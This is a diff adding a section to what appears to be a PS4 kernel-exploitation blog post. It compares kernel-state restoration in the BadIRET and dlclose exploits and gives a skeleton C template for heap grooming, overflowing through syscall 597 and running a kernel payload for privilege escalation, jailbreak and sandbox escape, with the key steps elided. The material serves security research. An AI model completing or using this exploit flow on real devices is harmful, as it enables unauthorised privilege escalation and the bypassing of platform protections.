@@ -701,6 +701,126 @@ syscall(597, 1, mapping, &amp;count);</code></pre>
 				
 				<br>
 				
+				<h2 id="restoration">Restoration of kernel state</h2>
+				<p>
+					The BadIRET exploit had a very convoluted execution flow, and required many additional stages after initially gaining kernel code execution before being suitible for general payload development.
+				</p>
+				
+				<p>
+					For example, with BadIRET we first gained kernel code execution under a very critical double fault context, which we then used to hijack an additional function pointer. 
+				</p>
+				
+				<p>
+					We then had to directly handle return back to userland by restoring the <code>swapgs</code> imbalance to ensure we had userland GS base, before then crafting a valid stack frame to return to with the <code>iret</code> instruction.
+				</p>
+				
+				<p>
+					We could then trigger the second payload from userland to gain kernel code execution under a normal context.
+				</p>
+				
+				<p>
+					Furthermore, the exploit relied on corrupting the IDT which we had to reinitialise before returning from the critical payload.
+				</p>
+				
+				<p>
+					The <code>dlclose</code> exploit doesn't require any of this, which makes it much easier and more direct to work with than BadIRET. After after calling <code>close</code> we immediately gain kernel code execution under a normal context. Secondly, since this exploit doesn't corrupt any global structures; if we perform it in a separate thread, any corruption will be discarded once the thread finishes and so we don't need to cleanup anything.
+				</p>
+				
+				<p>
+					The general template for this exploit is as follows:
+				</p>
+				
+				<pre><code>void payload(struct knote *kn) {
+	struct thread *td;
+	struct ucred *cred;
+	
+	asm volatile("mov %0, %%gs:0" : "=r"(td));
+	
+	kprintf("  [+] Entered kernel payload!\n");
+	
+	// Privilege escalation
+	...
+	
+	// Jailbreak
+	...
+	
+	// Sandbox escape
+	...
+	
+	// Enable UART output
+	...
+	
+	// Disable write protection
+	...
+
+	// Patch kernel functions
+	...
+	
+	// Restore write protection
+	...
+	
+	// Install kexec system call
+	...
+	
+	// etc...
+}
+
+void *exploitThread(void *arg) {
+	// Map the buffer, spray the heap, etc
+	...
+	
+	// Create hole for the system call's allocation
+	m = kernelAllocation(bufferSize);
+	m2 = kernelAllocation(bufferSize);
+	kernelFree(m);
+	
+	// Perform the overflow
+	syscall(597, 1, mapping, &amp;count);
+	
+	// Execute the payload
+	kernelFree(m2);
+	
+	return NULL;
+}
+
+int _main(void) {
+	int sock;
+	ScePthread thread;
+	
+	// Resolve functions, connect to socket, etc
+	...
+	
+	printf("[+] Starting...\n");
+	printf("[+] UID = %d\n", getuid());
+	
+	// Create exploit thread
+	if(scePthreadCreate(&amp;thread, NULL, exploitThread, NULL, "exploitThread") != 0) {
+		printf("[-] scePthreadCreate\n");
+		sceNetSocketClose(sock);
+		return 1;
+	}
+	
+	// Wait for thread to exit
+	scePthreadJoin(thread, NULL);
+	
+	// At this point we should have root and jailbreak
+	if(getuid() != 0) {
+		printf("[-] Kernel patch failed!\n");
+		sceNetSocketClose(sock);
+		return 1;
+	}
+	
+	printf("[+] Kernel patch success!\n");
+	
+	// Dump files, patch memory from other processes, boot Linux, etc
+	...
+	
+	sceNetSocketClose(sock);
+	return 0;
+}</code></pre>
+				
+				<br>
+				
 				<h2>Conclusion</h2>
 				<p>
 					Kernel code execution gives almost complete control over the system. I've described in <a href="ps4-3.html">my previous article</a> a few things you can experiment with: dumping the kernel, disabling CPU write protection to make patches to kernel code, reading and writing memory of other processes, privilege escalation, breaking out of FreeBSD jail, escaping sandbox and gaining full access to the file system, and I've also hinted at a few other things you can try: dumping and decrypting crash dumps (look into <code>/dev/da0x6</code> and <code>sceSblGetKernelCrashDumpEncKey</code>), decrypting saves (look into <code>sceSblSsDecryptSealedKey</code>), and dumping the registry (look into <code>sys_regmgr_call</code>).
